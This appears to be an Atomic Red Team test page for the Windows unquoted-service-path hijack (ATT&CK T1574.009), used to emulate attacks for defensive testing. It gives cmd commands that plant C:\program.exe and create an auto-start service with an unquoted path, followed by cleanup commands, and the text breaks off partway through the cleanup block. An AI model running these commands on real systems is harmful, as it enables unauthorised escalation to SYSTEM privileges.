# T1574.009 - Hijack Execution Flow: Path Interception by Unquoted Path

## Atomic Test #1 - Execution of program.exe as service with unquoted service path
When a service is created whose executable path contains spaces and isnâ€™t enclosed within quotes, leads to a vulnerability
known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.

**Supported Platforms:** Windows

#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| service_executable | Path of the executable used for the service and as the hijacked program.exe | path | PathToAtomicsFolder&#92;T1574.009&#92;bin&#92;WindowsServiceExample.exe|


#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
copy "#{service_executable}" "C:\Program Files\windows_service.exe"
copy "#{service_executable}" "C:\program.exe"
sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
sc start "Example Service"
```

#### Cleanup Commands:
```cmd
sc stop "Example Service" >nul 2>&1
sc delete "Example Service" >nul 2>&1
